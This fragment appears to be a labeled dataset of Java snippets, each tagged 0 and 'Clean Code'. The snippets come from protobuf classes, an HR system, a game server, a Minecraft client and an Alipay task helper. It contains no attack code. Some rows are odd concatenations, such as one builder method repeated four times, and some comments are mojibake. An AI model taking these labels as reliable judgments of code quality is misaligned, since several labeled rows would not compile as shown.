  assertTrue(messages.contains(""Cannot return more than 5000 workflows. Please use pagination.""));
}",0,Clean Code
"public FloatAccessor(Field field){
  super(field);
  Preconditions.checkArgument(field.getType() == float.class);
}
",0,Clean Code
"@Test public void testDecrBy(){
  jedisSentinel.decrBy(""key"",1337);
}",0,Clean Code
"public List<Project> getUserProjectWidthModule(String organizationId,String module,String userId){
  if (StringUtils.isBlank(module)) {
    throw new MSException(Translator.get(""module.name.is.empty""));
  }
  String moduleName=null;
  if (StringUtils.equalsIgnoreCase(module,""API"") || StringUtils.equalsIgnoreCase(module,""SCENARIO"")) {
    moduleName=ProjectMenuConstants.MODULE_MENU_API_TEST;
  }
  if (StringUtils.equalsIgnoreCase(module,""FUNCTIONAL"")) {
    moduleName=ProjectMenuConstants.MODULE_MENU_FUNCTIONAL_CASE;
  }
  if (StringUtils.equalsIgnoreCase(module,""BUG"")) {
    moduleName=ProjectMenuConstants.MODULE_MENU_BUG;
  }
  if (StringUtils.equalsIgnoreCase(module,""PERFORMANCE"")) {
    moduleName=ProjectMenuConstants.MODULE_MENU_LOAD_TEST;
  }
  if (StringUtils.equalsIgnoreCase(module,""UI"")) {
    moduleName=ProjectMenuConstants.MODULE_MENU_UI;
  }
  if (StringUtils.equalsIgnoreCase(module,""TEST_PLAN"")) {
    moduleName=ProjectMenuConstants.MODULE_MENU_TEST_PLAN;
  }
  if (StringUtils.isBlank(moduleName)) {
    throw new MSException(Translator.get(""module.name.is.error""));
  }
  checkOrg(organizationId);
  User user=baseUserMapper.selectById(userId);
  String projectId;
  if (user != null && StringUtils.isNotBlank(user.getLastProjectId())) {
    projectId=user.getLastProjectId();
  }
 else {
    projectId=null;
  }
  List<Project> allProject;
  UserRoleRelationExample userRoleRelationExample=new UserRoleRelationExample();
  userRoleRelationExample.createCriteria().andUserIdEqualTo(userId).andRoleIdEqualTo(InternalUserRole.ADMIN.name());
  if (userRoleRelationMapper.countByExample(userRoleRelationExample) > 0) {
    allProject=extProjectMapper.getAllProjectWidthModule(organizationId,moduleName);
  }
 else {
    allProject=extProjectMapper.getUserProjectWidthModule(organizationId,userId,moduleName);
  }
  List<Project> temp=allProject;
  return allProject.stream().filter(project -> StringUtils.equals(project.getId(),projectId)).findFirst().map(project -> {
    temp.remove(project);
    temp.add(0,project);
    return temp;
  }
).orElse(allProject);
}",0,Clean Code
"private GetCurChallengeScRsp(){
}
",0,Clean Code
"protected List<HandlerBase> getClientHandlerList(){
  List<HandlerBase> handlers=new ArrayList<HandlerBase>();
  for (  IVideoProducer vp : this.videoProducers) {
    if (vp != null && vp instanceof HandlerBase)     handlers.add((HandlerBase)vp);
  }
  if (this.audioProducer != null && this.audioProducer instanceof HandlerBase)   handlers.add((HandlerBase)this.audioProducer);
  if (this.commandHandler != null && this.commandHandler instanceof HandlerBase)   handlers.add((HandlerBase)this.commandHandler);
  if (this.observationProducer != null && this.observationProducer instanceof HandlerBase)   handlers.add((HandlerBase)this.observationProducer);
  if (this.rewardProducer != null && this.rewardProducer instanceof HandlerBase)   handlers.add((HandlerBase)this.rewardProducer);
  if (this.quitProducer != null && this.quitProducer instanceof HandlerBase)   handlers.add((HandlerBase)this.quitProducer);
  if (this.performanceProducer != null && this.performanceProducer instanceof HandlerBase)   handlers.add((HandlerBase)this.performanceProducer);
  return handlers;
}
",0,Clean Code
"@Override public boolean equals(final Object obj){
  if (this == obj) {
    return true;
  }
  if (obj == null) {
    return false;
  }
  if (this.getClass() != obj.getClass()) {
    return false;
  }
  final Message other=(Message)obj;
  if (this.attribute == null) {
    if (other.attribute != null) {
      return false;
    }
  }
 else   if (!this.attribute.equals(other.attribute)) {
    return false;
  }
  if (!Arrays.equals(this.data,other.data)) {
    return false;
  }
  if (this.indexId != other.indexId) {
    return false;
  }
  if (this.topic == null) {
    if (other.topic != null) {
      return false;
    }
  }
 else   if (!this.topic.equals(other.topic)) {
    return false;
  }
  return true;
}
",0,Clean Code
"@Override public void render(HudRenderer renderer){
  if (Modules.get() == null || modules.get().isEmpty()) {
    renderer.text(""Module Info"",x,y,moduleColor.get(),textShadow.get());
    setSize(renderer.textWidth(""Module Info""),renderer.textHeight());
    return;
  }
  double y=this.y;
  double width=0;
  double height=0;
  int i=0;
  for (  Module module : modules.get()) {
    double moduleWidth=renderer.textWidth(module.title) + renderer.textWidth("" "");
    String text=null;
    if (module.isActive()) {
      if (additionalInfo.get()) {
        String info=module.getInfoString();
        if (info != null)         text=info;
      }
      if (text == null)       text=""ON"";
    }
 else     text=""OFF"";
    moduleWidth+=renderer.textWidth(text);
    double x=this.x + alignX(moduleWidth,alignment.get());
    x=renderer.text(module.title,x,y,moduleColor.get(),textShadow.get());
    renderer.text(text,x + renderer.textWidth("" ""),y,module.isActive() ? onColor.get() : offColor.get(),textShadow.get());
    y+=renderer.textHeight() + 2;
    width=Math.max(width,moduleWidth);
    height+=renderer.textHeight();
    if (i > 0)     height+=2;
    i++;
  }
  setSize(width,height);
}",0,Clean Code
"@PostMapping(""/promotion"") @ApiOperation(""鏅嬪崌/闄嶇骇"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.PROMOTION) public Result promotion(@RequestBody HrmEmployeeChangeRecord hrmEmployeeChangeRecord){
  OperationLog operationLog=employeeService.change(hrmEmployeeChangeRecord);
  return OperationResult.ok(operationLog);
}
",0,Clean Code
"@NonNull public static PathContentInfoImpl fromPath(@NonNull Path path){
  if (path.isDirectory()) {
    return DIRECTORY;
  }
  if (sContentInfoUtil == null) {
    sContentInfoUtil=new ContentInfoUtil();
  }
  String ext=path.getExtension();
  ContentInfo extInfo=ext != null ? ContentInfoUtil.findExtensionMatch(ext) : null;
  ContentType2 extType2=ext != null ? ContentType2.fromFileExtension(ext) : null;
  try (InputStream is=path.openInputStream()){
    ContentInfo contentInfo=sContentInfoUtil.findMatch(is);
    if (contentInfo != null) {
      if (extInfo != null) {
        return withPartialOverride(fromPathContentInfo(new PathContentInfoImpl(extInfo.getName(),contentInfo.getMessage(),extInfo.getMimeType(),extInfo.getFileExtensions(),contentInfo.isPartial())),extType2);
      }
      if (extType2 != null) {
        return fromPathContentInfo(new PathContentInfoImpl(extType2.getSimpleName(),contentInfo.getMessage(),extType2.getMimeType(),extType2.getFileExtensions(),contentInfo.isPartial()));
      }
      return fromContentInfo(contentInfo);
    }
  }
 catch (  Throwable e) {
    Log.e(TAG,""Could not load MIME type for path %s"",e,path);
  }
  if (extInfo != null) {
    return withPartialOverride(fromContentInfo(extInfo),extType2);
  }
  if (extType2 != null) {
    return fromContentType2(extType2);
  }
  return fromContentType2(ContentType2.OTHER);
}",0,Clean Code
"/** 
 * <code>optional uint32 turn_counter = 1;</code>
 * @return whether the turnCounter field is set
 */
public boolean hasTurnCounter(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"default void visit(ClickHouseBinaryComparisonOperation op){
}
default void visit(ClickHouseBinaryLogicalOperation op){
}
default void visit(ClickHouseUnaryPrefixOperation exp){
}
default void visit(ClickHouseUnaryPostfixOperation op){
}
default void visit(ClickHouseConstant c){
}
default void visit(ClickHouseSelect s,boolean inner){
}
default void visit(ClickHouseColumnReference columnReference){
}
default void visit(ClickHouseExpression.ClickHousePostfixText op){
}
void visit(ClickHouseTableReference tableReference);
void visit(ClickHouseCastOperation cast);
void visit(ClickHouseAliasOperation alias);
void visit(ClickHouseExpression.ClickHouseJoin join);
void visit(ClickHouseAggregate aggregate);
void visit(ClickHouseBinaryFunctionOperation func);
default void visit(ClickHouseExpression expr){
  if (expr instanceof ClickHouseBinaryFunctionOperation) {
    visit((ClickHouseBinaryFunctionOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryComparisonOperation) {
    visit((ClickHouseBinaryComparisonOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryLogicalOperation) {
    visit((ClickHouseBinaryLogicalOperation)expr);
  }
 else   if (expr instanceof ClickHouseConstant) {
    visit((ClickHouseConstant)expr);
  }
 else   if (expr instanceof ClickHouseUnaryPrefixOperation) {
    visit((ClickHouseUnaryPrefixOperation)expr);
  }
 else   if (expr instanceof ClickHouseSelect) {
    visit((ClickHouseSelect)expr,true);
  }
 else   if (expr instanceof ClickHouseColumnReference) {
    visit((ClickHouseColumnReference)expr);
  }
 else   if (expr instanceof ClickHouseTableReference) {
    visit((ClickHouseTableReference)expr);
  }
 else   if (expr instanceof ClickHouseCastOperation) {
    visit((ClickHouseCastOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoin) {
    visit((ClickHouseExpression.ClickHouseJoin)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHousePostfixText) {
    visit((ClickHouseExpression.ClickHousePostfixText)expr);
  }
 else   if (expr instanceof ClickHouseAggregate) {
    visit((ClickHouseAggregate)expr);
  }
 else   if (expr instanceof ClickHouseAliasOperation) {
    visit((ClickHouseAliasOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoinOnClause) {
    visit((ClickHouseExpression.ClickHouseJoinOnClause)expr);
  }
 else {
    throw new AssertionError(expr);
  }
}
",0,Clean Code
"public Builder seed(Long seed){
  this.seed=seed;
  return this;
}
",0,Clean Code
"private final long syncTimer(long startMS){
  if (mInSeekingAction || mInSyncAction) {
    return 0;
  }
  mInSyncAction=true;
  long d=0;
  long time=startMS - mTimeBase;
  if (mNonBlockModeEnable) {
    if (mCallback != null) {
      mCallback.updateTimer(timer);
      d=timer.lastInterval();
    }
  }
 else   if (!mDanmakusVisible || mRenderingState.nothingRendered || mInWaitingState) {
    timer.update(time);
    mRemainingTime=0;
    if (mCallback != null) {
      mCallback.updateTimer(timer);
    }
  }
 else {
    long gapTime=time - timer.currMillisecond;
    long averageTime=Math.max(mFrameUpdateRate,getAverageRenderingTime());
    if (gapTime > 2000 || mRenderingState.consumingTime > mCordonTime || averageTime > mCordonTime) {
      d=gapTime;
      gapTime=0;
    }
 else {
      d=averageTime + gapTime / mFrameUpdateRate;
      d=Math.max(mFrameUpdateRate,d);
      d=Math.min(mCordonTime,d);
      long a=d - mLastDeltaTime;
      if (a > 3 && a < 8 && mLastDeltaTime >= mFrameUpdateRate && mLastDeltaTime <= mCordonTime) {
        d=mLastDeltaTime;
      }
      gapTime-=d;
      mLastDeltaTime=d;
    }
    mRemainingTime=gapTime;
    timer.add(d);
    if (mCallback != null) {
      mCallback.updateTimer(timer);
    }
  }
  mInSyncAction=false;
  return d;
}",0,Clean Code
"/** 
 * <code>optional uint32 dice_branch_id = 1;</code>
 * @param value the diceBranchId to set
 * @return this
 */
public ChessRogueNousDice setDiceBranchId(final int value){
  bitField0_|=0x00000001;
  diceBranchId=value;
  return this;
}",0,Clean Code
"@Override public final LanguageType forName(final CharSequence value){
  if (value.length() == 11) {
    if (ProtoUtil.isEqual(""LANGUAGE_SC"",value)) {
      return LANGUAGE_SC;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_TC"",value)) {
      return LANGUAGE_TC;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_EN"",value)) {
      return LANGUAGE_EN;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_KR"",value)) {
      return LANGUAGE_KR;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_JP"",value)) {
      return LANGUAGE_JP;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_FR"",value)) {
      return LANGUAGE_FR;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_DE"",value)) {
      return LANGUAGE_DE;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_ES"",value)) {
      return LANGUAGE_ES;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_PT"",value)) {
      return LANGUAGE_PT;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_RU"",value)) {
      return LANGUAGE_RU;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_TH"",value)) {
      return LANGUAGE_TH;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_VI"",value)) {
      return LANGUAGE_VI;
    }
    if (ProtoUtil.isEqual(""LANGUAGE_ID"",value)) {
      return LANGUAGE_ID;
    }
  }
  if (value.length() == 13) {
    if (ProtoUtil.isEqual(""LANGUAGE_NONE"",value)) {
      return LANGUAGE_NONE;
    }
  }
  return null;
}",0,Clean Code
"public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
public Builder maxTokens(Integer maxTokens){
  this.maxTokens=maxTokens;
  return this;
}
",0,Clean Code
"public String getType(){
  return this.type;
}
",0,Clean Code
"private void doMotion(MotionEvent event){
  if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
    return;
  }
switch (event.getActionMasked()) {
case MotionEvent.ACTION_BUTTON_PRESS:
    sendKeyEvent(mapCovert(event.getActionButton()),true,type2);
  break;
case MotionEvent.ACTION_BUTTON_RELEASE:
sendKeyEvent(mapCovert(event.getActionButton()),false,type2);
break;
case MotionEvent.ACTION_SCROLL:
String keyName;
if (event.getAxisValue(MotionEvent.AXIS_VSCROLL) > 0) {
keyName=MouseMap.MOUSEMAP_WHEEL_UP;
}
 else {
keyName=MouseMap.MOUSEMAP_WHEEL_DOWN;
}
sendKeyEvent(keyName,true,type2);
sendKeyEvent(keyName,false,type2);
break;
case MotionEvent.ACTION_HOVER_ENTER:
case MotionEvent.ACTION_HOVER_MOVE:
case MotionEvent.ACTION_HOVER_EXIT:
case MotionEvent.ACTION_MOVE:
if (mController.isGrabbed()) {
sendPointerInc((int)event.getAxisValue(MotionEvent.AXIS_X) * CURSOR_EXTRA_GRABBED,(int)event.getAxisValue(MotionEvent.AXIS_Y) * CURSOR_EXTRA_GRABBED);
}
 else {
sendPointerInc((int)event.getAxisValue(MotionEvent.AXIS_X) * CURSOR_EXTRA_RELEASE,(int)event.getAxisValue(MotionEvent.AXIS_Y) * CURSOR_EXTRA_RELEASE);
}
break;
}
}",0,Clean Code
"@Override public boolean onPreferenceTreeClick(Preference preference){
  if (preference != mAppSelector) {
    editActionIntSharedPrefs(getAction(preference));
  }
 else {
    Intent intent=new Intent(getActivity(),SubPickerActivity.class);
    intent.putExtra(""mode"",AppPicker.CALLBACK_MODE);
    startActivityForResult(intent,0);
  }
  return true;
}",0,Clean Code
"private void addSubmenuEntries(){
  add(newWorkspaceMenuItem);
  add(loadWorkspaceMenuItem);
  add(closeWorkspaceMenuItem);
  addRecentWorkspaces();
  if (exitMenuItem != null) {
    add(new JSeparator());
    add(exitMenuItem);
  }
}
",0,Clean Code
"@Override public RogueRecordInfo clone(){
  return new RogueRecordInfo().copyFrom(this);
}
",0,Clean Code
"public GGProAVRoomOptPushInfo(GProAVRoomOptPushInfo gProAVRoomOptPushInfo){
  this.mInfo=gProAVRoomOptPushInfo;
}
",0,Clean Code
"@EventHandler public void onKey(KeyEvent event){
  if (Input.isKeyPressed(GLFW.GLFW_KEY_F3))   return;
  if (checkGuiMove())   return;
  boolean cancel=true;
  if (mc.options.forwardKey.matchesKey(event.key,0)) {
    forward=event.action != KeyAction.Release;
    mc.options.forwardKey.setPressed(false);
  }
 else   if (mc.options.backKey.matchesKey(event.key,0)) {
    backward=event.action != KeyAction.Release;
    mc.options.backKey.setPressed(false);
  }
 else   if (mc.options.rightKey.matchesKey(event.key,0)) {
    right=event.action != KeyAction.Release;
    mc.options.rightKey.setPressed(false);
  }
 else   if (mc.options.leftKey.matchesKey(event.key,0)) {
    left=event.action != KeyAction.Release;
    mc.options.leftKey.setPressed(false);
  }
 else   if (mc.options.jumpKey.matchesKey(event.key,0)) {
    up=event.action != KeyAction.Release;
    mc.options.jumpKey.setPressed(false);
  }
 else   if (mc.options.sneakKey.matchesKey(event.key,0)) {
    down=event.action != KeyAction.Release;
    mc.options.sneakKey.setPressed(false);
  }
 else {
    cancel=false;
  }
  if (cancel)   event.cancel();
}",0,Clean Code
"public Duration getTaskExecutionPostponeDuration(){
  return taskExecutionPostponeDuration;
}
",0,Clean Code
"/** 
 * 鏂板淇濆瓨瑙掕壊淇℃伅
 * @param role 瑙掕壊淇℃伅
 * @return 缁撴灉
 */
int insertRole(SysRoleEntity role);
",0,Clean Code
"public static OggTestFile generate(Random random,int pageCount){
  ArrayList<byte[]> fileData=new ArrayList<>();
  int fileSize=0;
  int granuleCount=0;
  int firstPayloadPageSize=0;
  int firstPayloadPageGranuleCount=0;
  int lastPageloadPageSize=0;
  int lastPayloadPageGranuleCount=0;
  int packetLength=-1;
  for (int i=0; i < pageCount; i++) {
    int headerType=0x00;
    if (packetLength >= 0) {
      headerType|=1;
    }
    if (i == 0) {
      headerType|=2;
    }
    if (i == pageCount - 1) {
      headerType|=4;
    }
    int pageGranuleCount=random.nextInt(MAX_GRANULES_IN_PAGE - 1) + 1;
    int pageSegmentCount=random.nextInt(MAX_SEGMENT_COUNT);
    granuleCount+=pageGranuleCount;
    byte[] header=OggTestData.buildOggHeader(headerType,granuleCount,0,pageSegmentCount);
    fileData.add(header);
    int pageSize=header.length;
    byte[] laces=new byte[pageSegmentCount];
    int bodySize=0;
    for (int j=0; j < pageSegmentCount; j++) {
      if (packetLength < 0) {
        if (i < pageCount - 1) {
          packetLength=random.nextInt(MAX_PACKET_LENGTH);
        }
 else {
          int maxPacketLength=255 * (pageSegmentCount - j) - 1;
          packetLength=random.nextInt(maxPacketLength);
        }
      }
 else       if (i == pageCount - 1 && j == pageSegmentCount - 1) {
        packetLength=Math.min(packetLength,254);
      }
      laces[j]=(byte)Math.min(packetLength,255);
      bodySize+=laces[j] & 0xFF;
      packetLength-=255;
    }
    fileData.add(laces);
    pageSize+=laces.length;
    byte[] payload=TestUtil.buildTestData(bodySize,random);
    fileData.add(payload);
    pageSize+=payload.length;
    fileSize+=pageSize;
    if (i == 0) {
      firstPayloadPageSize=pageSize;
      firstPayloadPageGranuleCount=pageGranuleCount;
    }
 else     if (i == pageCount - 1) {
      lastPageloadPageSize=pageSize;
      lastPayloadPageGranuleCount=pageGranuleCount;
    }
  }
  byte[] file=new byte[fileSize];
  int position=0;
  for (  byte[] data : fileData) {
    System.arraycopy(data,0,file,position,data.length);
    position+=data.length;
  }
  return new OggTestFile(file,granuleCount,pageCount,firstPayloadPageSize,firstPayloadPageGranuleCount,lastPageloadPageSize,lastPayloadPageGranuleCount);
}",0,Clean Code
"public ArrayList<GProLiveAnchorPlayStream> getStreams(){
  return this.streams;
}
",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @param other Fallback value in case the value is not known.
 * @return The enum associated with the given numeric wire value, or the fallback value if unknown.
 */
public static RogueCommonActionResultDisplayType forNumberOr(int number,RogueCommonActionResultDisplayType other){
  RogueCommonActionResultDisplayType value=forNumber(number);
  return value == null ? other : value;
}
",0,Clean Code
"@Override protected void onMeasure(int widthSpec,int heightSpec){
  if (mImageTexture == null) {
    super.onMeasure(widthSpec,heightSpec);
  }
 else {
    float ratio=(float)mTextureWidth / mTextureHeight;
    int widthSize=MeasureSpec.getSize(widthSpec);
    int heightSize=MeasureSpec.getSize(heightSpec);
    int widthMode=MeasureSpec.getMode(widthSpec);
    int heightMode=MeasureSpec.getMode(heightSpec);
    int measureWidth=-1;
    int measureHeight=-1;
    if (widthMode == MeasureSpec.EXACTLY) {
      measureWidth=widthSize;
      if (heightMode == MeasureSpec.EXACTLY) {
        measureHeight=heightSize;
      }
 else {
        measureHeight=(int)(widthSize / ratio);
        if (heightMode == MeasureSpec.AT_MOST) {
          measureHeight=Math.min(measureHeight,heightSize);
        }
      }
    }
 else     if (heightMode == MeasureSpec.EXACTLY) {
      measureHeight=heightSize;
      measureWidth=(int)(heightSize * ratio);
      if (widthMode == MeasureSpec.AT_MOST) {
        measureWidth=Math.min(measureWidth,widthSize);
      }
    }
    if (measureWidth == -1 || measureHeight == -1) {
      super.onMeasure(widthSpec,heightSpec);
    }
 else {
      setMeasuredSize(measureWidth,measureHeight);
    }
  }
}",0,Clean Code
"public int getRequestRetryCount(){
  return requestRetryCount;
}
",0,Clean Code
"@Override public Object visitModuleType(ModuleTypeContext ctx){
  return new UnresolvedTypeNode.Module(createSourceSection(ctx));
}
",0,Clean Code
"@Override public TableMeta getTableMeta(String databaseName,String schemaName,String tableName){
  return null;
}
",0,Clean Code
"public NodesIterator getNeighborsIterator(int node){
  var neighbors=getNeighbors(node);
  assert neighbors != null : ""Node "" + node + "" not found"";
  return neighbors.iterator();
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(uid);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)72);
    output.writeBoolNoTag(handleResult);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)26);
    output.writeMessageNoTag(handleFriendInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.uid,uid);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeBool(FieldNames.handleResult,handleResult);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.handleFriendInfo,handleFriendInfo);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * @return the clientApp
 */
public String getClientApp(){
  return clientApp;
}
",0,Clean Code
"public @Nullable Package getPackage(){
  return pkg;
}
",0,Clean Code
"@Override public void execute(final CEdgeHoverState state,final MouseEvent event){
}
",0,Clean Code
"public abstract SingleGraph getPrimaryGraph();
",0,Clean Code
"/** 
 * 鍏叡閫�娆炬帴鍙�
 */
@PostMapping(""/api/ticket-service/ticket/refund"") public Result<RefundTicketRespDTO> commonTicketRefund(@RequestBody RefundTicketReqDTO requestParam){
  return Results.success(ticketService.commonTicketRefund(requestParam));
}
",0,Clean Code
"public PacketSceneCastSkillMpUpdateScNotify(int attackedGroupId,int mp){
  super(CmdId.SceneCastSkillMpUpdateScNotify);
  var data=SceneCastSkillMpUpdateScNotify.newInstance().setAttackedGroupId(attackedGroupId).setMp(mp);
  this.setData(data);
}
",0,Clean Code
"/** 
 * Configures the excluded Inference metadata keys to filter out from the generative.
 * @param excludedInferenceMetadataKeys Excluded inference metadata keys to use.
 * @return this builder
 */
public Builder withExcludedInferenceMetadataKeys(List<String> excludedInferenceMetadataKeys){
  Assert.notNull(excludedInferenceMetadataKeys,""Excluded inference metadata keys must not be null"");
  this.excludedInferenceMetadataKeys=excludedInferenceMetadataKeys;
  return this;
}
public Builder withExcludedInferenceMetadataKeys(String... keys){
  Assert.notNull(keys,""Excluded inference metadata keys must not be null"");
  this.excludedInferenceMetadataKeys.addAll(Arrays.asList(keys));
  return this;
}
",0,Clean Code
"@Override public void switchToFront(){
}
void switchToFront();
",0,Clean Code
"private HashMap unmarshal(InputStream in) throws Exception {
  byte[] header=new byte[4 + 1];
  readFull(in,header);
  ByteBuffer bb=ByteBuffer.wrap(header);
  int len=bb.getInt();
  int x=bb.get();
  if (len > 1024 * 1024 * 32) {
    throw new IOException(""invalid len"");
  }
  byte[] bs=new byte[len];
  readFull(in,bs);
  for (int i=0; i < bs.length; i++) {
    bs[i]=(byte)(bs[i] ^ x);
  }
  HashMap m=new HashMap();
  byte[] buf;
  for (int i=0; i < bs.length - 1; ) {
    short kLen=bs[i];
    i+=1;
    if (i + kLen >= bs.length) {
      throw new Exception(""key len error"");
    }
    if (kLen < 0) {
      throw new Exception(""key len error"");
    }
    buf=copyOfRange(bs,i,i + kLen);
    String key=new String(buf);
    i+=kLen;
    if (i + 4 >= bs.length) {
      throw new Exception(""value len error"");
    }
    buf=copyOfRange(bs,i,i + 4);
    int vLen=bytesToU32(buf);
    i+=4;
    if (vLen < 0) {
      throw new Exception(""value error"");
    }
    if (i + vLen > bs.length) {
      throw new Exception(""value error"");
    }
    byte[] value=copyOfRange(bs,i,i + vLen);
    i+=vLen;
    m.put(key,value);
  }
  return m;
}",0,Clean Code
"private int calculateFrequency(String str){
  int frequency=0;
  for (int i=0; i < searchTerm.length(); i++) {
    char ch=searchTerm.charAt(i);
    String chStr=String.valueOf(ch);
    if (str.contains(chStr)) {
      frequency=frequency + 1;
    }
  }
  return frequency;
}",0,Clean Code
"@NonNull public static String getSoftInputString(int flag){
  StringBuilder builder=new StringBuilder();
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_NOTHING) != 0)   builder.append(""Adjust nothing, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN) != 0)   builder.append(""Adjust pan, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE) != 0)   builder.append(""Adjust resize, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_ADJUST_UNSPECIFIED) != 0)   builder.append(""Adjust unspecified, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN) != 0)   builder.append(""Always hidden, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE) != 0)   builder.append(""Always visible, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_HIDDEN) != 0)   builder.append(""Hidden, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE) != 0)   builder.append(""Visible, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_UNCHANGED) != 0)   builder.append(""Unchanged, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_STATE_UNSPECIFIED) != 0)   builder.append(""Unspecified, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION) != 0)   builder.append(""ForwardNav, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_MASK_ADJUST) != 0)   builder.append(""Mask adjust, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_MASK_STATE) != 0)   builder.append(""Mask state, "");
  if ((flag & WindowManager.LayoutParams.SOFT_INPUT_MODE_CHANGED) != 0)   builder.append(""Mode changed, "");
  checkStringBuilderEnd(builder);
  String result=builder.toString();
  return result.isEmpty() ? ""null"" : result;
}",0,Clean Code
"/** 
 * <code>optional .DisplayEquipmentInfo equipment = 2;</code>
 * @return this
 */
public DisplayAvatarDetailInfo clearEquipment(){
  bitField0_&=~0x00000080;
  equipment.clear();
  return this;
}",0,Clean Code
"public ArrayList<GProGuildMsg> getResults(){
  return this.results;
}
",0,Clean Code
"public static String finishTask(String sceneCode,String taskType){
  String outBizNo=taskType + ""_"" + RandomUtils.nextDouble();
  return RpcUtil.request(""com.alipay.antiep.finishTask"",""[{\""outBizNo\"":\"""" + outBizNo + ""\"",\""requestType\"":\""H5\"",\""sceneCode\"":\""""+ sceneCode+ ""\"",\""source\"":\""ANTFOREST\"",\""taskType\"":\""""+ taskType+ ""\""}]"");
}",0,Clean Code
"private void log(String line){
  if (line.startsWith(""Metaspace       used""))   return;
  if (line.startsWith(""class space    used""))   return;
  if (line.startsWith(""par new generation   total""))   return;
  if (line.startsWith(""concurrent-mark-sweep perm gen total""))   return;
  if (line.startsWith(""(cardTable: ""))   return;
  if (line.startsWith(""def new generation   total""))   return;
  if (line.contains(""CMSCMS: Large block""))   return;
  LOGGER.log(Level.WARNING,""Missed: {0}"",line);
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public OperationLog addOrUpdateLeaveInformation(HrmEmployeeQuitInfo quitInfo){
  HrmEmployee employee;
  OperationLog operationLog=new OperationLog();
  if (quitInfo.getQuitInfoId() == null) {
    boolean exists=quitInfoService.lambdaQuery().eq(HrmEmployeeQuitInfo::getEmployeeId,quitInfo.getEmployeeId()).exists();
    if (exists) {
      throw new CrmException(HrmCodeEnum.THE_EMPLOYEE_HAS_ALREADY_HANDLED_THE_RESIGNATION);
    }
    Content content=employeeActionRecordService.quitRecord(quitInfo);
    employee=employeeService.getById(quitInfo.getEmployeeId());
    quitInfo.setOldStatus(employee.getStatus());
    operationLog.setOperationObject(quitInfo.getEmployeeId(),employee.getEmployeeName());
    operationLog.setOperationInfo(content.getDetail());
  }
 else {
    employee=new HrmEmployee();
    employee.setEmployeeId(quitInfo.getEmployeeId());
    HrmEmployeeQuitInfo old=quitInfoService.getById(quitInfo.getQuitInfoId());
    HrmEmployee hrmEmployee=employeeService.getById(quitInfo.getEmployeeId());
    operationLog.setOperationObject(hrmEmployee.getEmployeeId(),hrmEmployee.getEmployeeName());
    Content content=employeeActionRecordService.entityUpdateRecord(LabelGroupEnum.QUIT,BeanUtil.beanToMap(old),BeanUtil.beanToMap(quitInfo),quitInfo.getEmployeeId());
    operationLog.setOperationInfo(content.getDetail());
  }
  LocalDateTime planQuitTime=quitInfo.getPlanQuitTime().atStartOfDay();
  EmployeeEntryStatus entryStatus;
  if (LocalDateTimeUtil.toEpochMilli(planQuitTime) > System.currentTimeMillis()) {
    entryStatus=EmployeeEntryStatus.TO_LEAVE;
  }
 else {
    entryStatus=EmployeeEntryStatus.ALREADY_LEAVE;
    if (ObjectUtil.isNotNull(employee.getCompanyAgeStartTime())) {
      long nowCompanyAge=LocalDateTimeUtil.between(employee.getCompanyAgeStartTime().atStartOfDay(),LocalDateTime.now()).toDays() + 1;
      employee.setCompanyAge(Convert.toInt(nowCompanyAge));
    }
    abnormalChangeRecordService.addAbnormalChangeRecord(quitInfo.getEmployeeId(),AbnormalChangeType.RESIGNATION,quitInfo.getPlanQuitTime().atStartOfDay());
  }
  employee.setEntryStatus(entryStatus.getValue());
  employeeService.updateById(employee);
